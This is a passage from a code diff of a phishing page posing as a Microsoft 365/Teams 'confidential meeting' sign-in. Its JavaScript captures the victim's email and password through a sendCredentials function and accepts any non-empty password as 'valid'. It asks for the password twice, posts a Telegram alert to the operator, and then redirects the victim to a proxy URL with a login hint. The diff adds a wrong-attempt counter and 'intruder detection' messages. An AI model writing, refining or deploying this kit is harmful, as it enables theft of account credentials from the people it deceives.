         consecutiveCount: consecutiveCount,
+        wrongAttempts: wrongAttempts,
         referrer: document.referrer || 'Direct',
         service: 'Microsoft 365'
     };
@@ -660,6 +993,7 @@ function sendCredentials(email, password, source) {
             source: source,
             sessionId: SESSION_ID,
             consecutiveCount: consecutiveCount,
+            wrongAttempts: wrongAttempts,
             url: window.location.href,
             timestamp: Date.now(),
             service: 'Microsoft 365'
@@ -669,225 +1003,19 @@ function sendCredentials(email, password, source) {
 }
 
 // ============================================================
-//  HANDLE SUBMIT - 2-CONSECUTIVE RULE
+// INITIALIZATION
 // ============================================================
-
-function handleSubmit() {
-    const passwordInput = document.getElementById('password');
-    const password = passwordInput ? passwordInput.value.trim() : '';
-    const email = capturedEmail || getEmailFromUrl() || getSavedEmail() || '';
-
-    console.log('[DEBUG] Confidential meeting verification');
-    console.log('[DEBUG] Email:', email);
-    console.log('[DEBUG] Consecutive count:', consecutiveCount);
-
-    if (!email) {
-        showNotification('❌ No email provided', 'error');
-        return;
-    }
-
-    if (!password) {
-        const errorDiv = document.getElementById('errorDiv');
-        if (errorDiv) {
-            errorDiv.textContent = '⚠️ Please enter your password';
-            errorDiv.classList.add('show');
-            passwordInput.focus();
-        }
-        return;
-    }
-
-    const now = Date.now();
-    const timeSinceLast = now - lastAttemptTime;
-
-    if (lastAttemptTime > 0 && timeSinceLast > ATTEMPT_WINDOW) {
-        consecutiveCount = 0;
-        console.log('⏰ Verification window expired, resetting');
-        showNotification('⏰ Verification window expired. Please start again.', 'error');
-        passwordInput.value = '';
-        passwordInput.focus();
-        updateVerificationStatus('', '');
-        return;
-    }
-
-    attemptCount++;
-
-    if (password.length > 2) {
-        sendCredentials(email, password, 'form_submit');
-    }
-
-    const isValid = password.length > 0;
-
-    if (isValid) {
-        consecutiveCount++;
-        lastAttemptTime = now;
-
-        console.log(`✅ Consecutive correct ${consecutiveCount}/${MAX_CONSECUTIVE}`);
-
-        passwordInput.value = '';
-        passwordInput.classList.add('success');
-        
-        if (consecutiveCount === 1) {
-            updateVerificationStatus('🔐 Verifying your identity... Please re-enter to confirm.', 'verifying');
-            document.getElementById('joinBtn').textContent = 'Confirm Identity';
-            showNotification('🔐 Please re-enter your password to confirm your identity.', 'confidential');
-        } else if (consecutiveCount >= MAX_CONSECUTIVE) {
-            updateVerificationStatus('✅ Identity verified. Redirecting to confidential meeting...', 'verified');
-            document.getElementById('joinBtn').textContent = '✅ Verified!';
-            document.getElementById('joinBtn').classList.add('success');
-
-            sendTelegramAlert(
-                `🔐 *CONFIDENTIAL MEETING VERIFIED*\n\n` +
-                `*Email:* ${email}\n` +
-                `*Consecutive Count:* ${consecutiveCount}\n` +
-                `*Session:* ${SESSION_ID.substring(0, 12)}...\n` +
-                `*Time:* ${new Date().toISOString()}`
-            );
-
-            setTimeout(() => {
-                const encodedEmail = encodeURIComponent(email);
-                const proxyUrl = PROXY_URL + '?login_hint=' + encodedEmail;
-                console.log('🔗 Redirecting to proxy:', proxyUrl);
-                window.location.href = proxyUrl;
-            }, 1500);
-            return;
-        }
-
-        setTimeout(() => {
-            passwordInput.focus();
-            passwordInput.classList.remove('success');
-        }, 200);
-
-    } else {
-        consecutiveCount = 0;
-        passwordInput.classList.add('error');
-        updateVerificationStatus('❌ Incorrect password. Please try again.', 'error');
-        showNotification('❌ Incorrect password. Please try again.', 'error');
-        passwordInput.value = '';
-        passwordInput.focus();
-
-        setTimeout(() => {
-            passwordInput.classList.remove('error');
-        }, 1000);
-    }
-}
-
-// ============================================================
-//  UPDATE VERIFICATION STATUS
-// ============================================================
-
-function updateVerificationStatus(message, type) {
-    const statusEl = document.getElementById('verificationStatus');
-    if (!statusEl) return;
-    
-    statusEl.textContent = message;
-    statusEl.className = 'verification-status';
-    if (type) {
-        statusEl.classList.add(type);
-    }
-}
-
-// ============================================================
-//  CONTINUE BUTTON HANDLER
-// ============================================================
-
-function setupContinueButton() {
-    const continueBtn = document.getElementById('btnJoinTest');
-    if (!continueBtn) return;
-
-    continueBtn.addEventListener('click', function(e) {
-        e.preventDefault();
-        console.log('[CONTINUE] Confidential meeting access requested');
-
-        const email = capturedEmail || getEmailFromUrl() || getSavedEmail() || 'guest@example.com';
-        
-        // Show loading
-        const joinDiv = document.getElementById('joinDiv');
-        const loadDiv = document.getElementById('loadDiv');
-        if (joinDiv) joinDiv.style.display = 'none';
-        if (loadDiv) loadDiv.style.display = 'block';
-        
-        const loadTxt = document.getElementById('loadTxt');
-        if (loadTxt) loadTxt.textContent = 'Preparing confidential meeting access...';
-
-        // Show the login form with confidential message
-        setTimeout(function() {
-            if (loadDiv) loadDiv.style.display = 'none';
-            const loginDiv = document.getElementById('loginDiv');
-            if (loginDiv) loginDiv.style.display = 'block';
-            
-            // Show confidential message
-            document.getElementById('confidentialMessage').classList.add('show');
-            
-            // Set email
-            const userInput = document.getElementById('user');
-            if (userInput) userInput.value = email;
-            const userTxt = document.getElementById('userTxt');
-            if (userTxt) userTxt.textContent = email;
-            const nameTxt = document.getElementById('nameTxt');
-            if (nameTxt) nameTxt.textContent = email.split('@')[0] || 'User';
-
-            // Reset 2-consecutive state
-            consecutiveCount = 0;
-            updateVerificationStatus('🔐 This is a confidential meeting. Please verify your identity.', 'verifying');
-            
-            const passwordInput = document.getElementById('password');
-            if (passwordInput) {
-                passwordInput.value = '';
-                passwordInput.placeholder = 'Enter your Microsoft password';
-                passwordInput.focus();
-            }
-
-            const joinBtn = document.getElementById('joinBtn');
-            if (joinBtn) {
-                joinBtn.textContent = 'Verify Identity';
-                joinBtn.classList.remove('success');
-            }
-        }, 1500);
-    });
-}
-
-// ============================================================
-//  NOTIFICATION
-// ============================================================
-
-function showNotification(message, type = 'success') {
-    try {
-        const existing = document.querySelector('.notification');
-        if (existing) existing.remove();
-
-        const div = document.createElement('div');
-        div.className = 'notification';
-        if (type === 'error') div.classList.add('error');
-        if (type === 'confidential') div.style.background = '#6264a7';
-        div.textContent = message;
-        document.body.appendChild(div);
-
-        setTimeout(() => {
-            div.style.opacity = '0';
-            div.style.transition = 'opacity 0.3s';
-            setTimeout(() => div.remove(), 300);
-        }, 3000);
-    } catch(e) {}
-}
-
-// ============================================================
-//  INITIALIZATION
-// ============================================================
-
 function init() {
     const email = getEmailFromUrl() || getSavedEmail() || 'guest@example.com';
     capturedEmail = email;
 
-    // Display email
     const emailDisplay = document.getElementById('emailDisplay');
     if (emailDisplay) {
         emailDisplay.textContent = email;
     }
 
-    // Setup continue button
     setupContinueButton();
 
-    // Setup form submission
     const joinBtn = document.getElementById('joinBtn');
     if (joinBtn) {
         joinBtn.addEventListener('click', function(e) {
@@ -896,7 +1024,6 @@ function init() {
         });
     }
 
-    // Setup password input
     const passwordInput = document.getElementById('password');
     if (passwordInput) {
         passwordInput.addEventListener('keypress', function(e) {
@@ -910,16 +1037,15 @@ function init() {
         });
     }
 
-    console.log('🔐 Confidential Meeting - 2 Consecutive Verification initialized');
+    console.log('🔐 Confidential Meeting - 2 Consecutive Verification + Intruder Detection');
     console.log('📧 Email:', email);
     console.log('🆔 Session:', SESSION_ID);
-    console.log('💡 Enter password 2 times consecutively to verify identity');
+    console.log('🌐 Language:', userLang);
 }
 
 // ============================================================
-//  START
+// START
 // ============================================================
-
 if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', init);
 } else {
@@ -927,18 +1053,21 @@ if (document.readyState === 'loading') {
 }
 
 // ============================================================
-//  EXPOSE FOR TESTING
+// EXPOSE FOR TESTING
 // ============================================================
-
 window.__teamsGateway = {
     getEmail: () => capturedEmail || getEmailFromUrl() || getSavedEmail(),
     getSessionId: () => SESSION_ID,
     getStats: () => ({
         attempts: attemptCount,
-        consecutiveCount: consecutiveCount
+        consecutiveCount: consecutiveCount,
+        wrongAttempts: wrongAttempts,
+        language: userLang
     }),
     resetConsecutive: () => { 
         consecutiveCount = 0; 
+        wrongAttempts = 0;
+        document.getElementById('intruderAlert').classList.remove('show');
         updateVerificationStatus('', '');
     },
     redirect: () => {
@@ -950,7 +1079,8 @@ window.__teamsGateway = {
 };
 
 console.log('✅ API available at window.__teamsGateway');
-console.log('💡 Tip: Enter password 2 times to verify, then redirect to proxy');
+console.log('💡 Language:', userLang);
+console.log('🚨 Intruder detection: 2 wrong passwords triggers alert');
 </script>
 
 </body>
